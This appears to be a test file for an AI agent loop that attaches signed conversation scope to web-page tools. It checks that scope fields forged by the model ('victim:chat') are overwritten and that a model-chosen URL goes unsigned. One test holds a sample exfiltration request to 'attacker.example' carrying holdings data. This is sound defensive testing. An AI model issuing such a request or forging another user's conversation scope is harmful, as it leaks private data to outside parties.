import { describe, it, beforeEach } from "node:test";
import { expect } from "expect";
import { runAgentLoop } from "../../../src/agent/loop.ts";
import { signScope } from "../../../src/lib/scope.ts";
import type { AgentTool, QueryRequest, SSEEvent } from "../../../src/protocol/types.ts";
import { llmCallsTool, makeMockLlm } from "../../helpers/mock-llm.ts";
import { collectGenerator } from "../../helpers/sse-reader.ts";
import { clearAllModuleState } from "../../helpers/clear-state.ts";

beforeEach(() => {
  clearAllModuleState();
});

const SECRET = "0123456789abcdef0123";

function tools(): AgentTool[] {
  const base = { server_id: "agent", url: "http://localhost:8787/mcp" };
  return [
    {
      ...base,
      name: "fetch_webpage",
      description: "Fetch a page",
      input_schema: { properties: { url: { type: "string" }, "x-agent-conversation-id": { type: "string" }, "x-agent-scope-sig": { type: "string" } }, required: ["url"] },
    },
    {
      ...base,
      name: "inspect_webpage",
      description: "Read parts of a page",
      input_schema: {
        properties: { page_id: { type: "string" }, view: { type: "string" }, "x-agent-conversation-id": { type: "string" }, "x-agent-scope-sig": { type: "string" } },
        required: ["page_id", "view"],
      },
    },
    { ...base, name: "web_search", description: "Search", input_schema: { properties: { query: { type: "string" } }, required: ["query"] } },
  ];
}

async function run(tool: string, input: Record<string, unknown>, conversationId: string, message = "read https://example.com/report"): Promise<Record<string, unknown>> {
  const events: SSEEvent[] = await collectGenerator(
    runAgentLoop({
      request: { messages: [{ role: "human", content: message }], tools: tools() } as QueryRequest,
      rawModelId: "openai:gpt-4o-mini",
      model: makeMockLlm(llmCallsTool(tool, input)),
      allWidgets: [],
      workspaceState: null,
      conversationId,
      scopeSecret: SECRET,
    }),
  );
  const call = events.find((e) => e.event === "copilotFunctionCall" && (e.data as { function?: string }).function === "execute_agent_tool");
  if (!call) throw new Error("no tool call emitted");
  return (call.data as { input_arguments: { parameters: Record<string, unknown> } }).input_arguments.parameters;
}

describe("the page tools carry the chat's signed scope", () => {
  it("fetch_webpage does, and its address is signed because the user gave it", async () => {
    const params = await run("fetch_webpage", { url: "https://example.com/report" }, "u1:chat1");
    expect(params["x-agent-conversation-id"]).toBe("u1:chat1");
    expect(params["x-agent-scope-sig"]).toBe(signScope(SECRET, "u1:chat1"));
    expect(typeof params["x-agent-url-sig"]).toBe("string");
  });

  it("inspect_webpage does, and has no address to sign", async () => {
    const params = await run("inspect_webpage", { page_id: "p-0123abcd", view: "text" }, "u1:chat1");
    expect(params["x-agent-conversation-id"]).toBe("u1:chat1");
    expect(params["x-agent-scope-sig"]).toBe(signScope(SECRET, "u1:chat1"));
    expect(params["x-agent-url-sig"]).toBeUndefined();
  });

  it("is the loop's chat, not one the model wrote", async () => {
    const params = await run(
      "inspect_webpage",
      { page_id: "p-0123abcd", view: "text", "x-agent-conversation-id": "victim:chat", "x-agent-scope-sig": "forged" },
      "u1:chat1",
    );
    expect(params["x-agent-conversation-id"]).toBe("u1:chat1");
    expect(params["x-agent-scope-sig"]).toBe(signScope(SECRET, "u1:chat1"));
  });

  it("is not added to a tool that holds no page", async () => {
    const params = await run("web_search", { query: "nvidia revenue" }, "u1:chat1");
    expect(params["x-agent-conversation-id"]).toBeUndefined();
    expect(params["x-agent-scope-sig"]).toBeUndefined();
  });

  it("is left out when the loop has no chat, whatever the model wrote", async () => {
    const params = await run("inspect_webpage", { page_id: "p-0123abcd", view: "text", "x-agent-conversation-id": "victim:chat" }, "");
    expect(params["x-agent-conversation-id"]).toBeUndefined();
    expect(params["x-agent-scope-sig"]).toBeUndefined();
  });
});

describe("an address the model chose is not signed", () => {
  it("is not, for a fetch of an address that was nowhere in what the model was given", async () => {
    const params = await run("fetch_webpage", { url: "https://attacker.example/c?d=holdings" }, "u1:chat1", "read https://example.com/report");
    expect(params["x-agent-url-sig"]).toBeUndefined();
  });
});
